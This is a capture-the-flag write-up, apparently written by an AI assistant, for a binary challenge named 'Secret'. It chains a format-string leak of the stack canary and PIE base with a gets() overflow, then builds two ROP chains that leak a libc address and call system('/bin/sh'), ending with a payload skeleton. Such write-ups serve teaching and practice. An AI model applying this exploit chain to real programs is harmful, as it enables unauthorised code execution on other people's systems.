Here is the markdown writeup for the "Secret" challenge.

---

# Secret Challenge Writeup

## Vulnerability Analysis

The binary contains two distinct vulnerabilities that must be chained together to achieve code execution:

1. **Format String Vulnerability in `main()**`:
```c
read(0, buffer, 0x40);
printf("Hillo ");
printf(buffer); // VULN: User input passed directly to printf

```


This allows us to leak values from the stack.
2. **Stack Buffer Overflow in `secret()**`:
```c
gets(buffer); // VULN: Unbounded write (buffer is 136 bytes)

```


The `gets` function allows us to overwrite the stack, including the canary and the return address.

## Exploit Steps

Since the binary has **PIE** (Position Independent Executable) and **Stack Canaries** enabled, we cannot jump directly to known addresses or overflow the buffer blindly.

### 1. Leak Canary and PIE Base

We use the format string vulnerability in `main` to leak the necessary addresses.

* **Canary**: Located at offset **15** (`%15$p`).
* **Return Address**: Located at offset **21** (`%21$p`). This leaks an address inside `main` (specifically `__libc_start_main+x`), allowing us to calculate the binary's base address.

### 2. ROP Chain 1: Leak Libc

Now inside `secret()`, we trigger the buffer overflow. We construct a ROP chain to leak a libc address (`puts`) to bypass ASLR.

* **Payload**: `Padding (136)` + `Canary` + `RBP (8)` + `ROP Chain`.
* **Chain**:
1. `pop rdi; ret` (Gadget)
2. `puts@got` (Argument: Address of puts entry in GOT)
3. `puts@plt` (Function: Call puts to print the address)
4. `_start` (Return: Restart the program to send a second payload)



### 3. Calculate Libc Base

We receive the leaked address of `puts`. Using a libc database (or the provided libc), we calculate the base address:

```python
libc.address = leak_puts - libc.symbols['puts']

```

### 4. ROP Chain 2: Get Shell

The program restarts (thanks to `_start`). We bypass the name prompt and reach `secret()` again. Now we send the final ROP chain to spawn a shell.

* **Chain**:
1. `ret` (Gadget: Align stack to 16 bytes for `system`)
2. `pop rdi; ret`
3. `address of "/bin/sh"`
4. `system`



### Visual Exploit Flow

### Final Payload Structure

```python
payload = flat(
    b'a' * 136,            # Buffer Padding
    canary,                # Restore Canary (Must be correct!)
    b'b' * 8,              # Overwrite Saved RBP
    ret_gadget,            # Stack Alignment
    pop_rdi,               # Load Argument
    bin_sh_addr,           # "/bin/sh"
    system_addr            # Call system()
)

```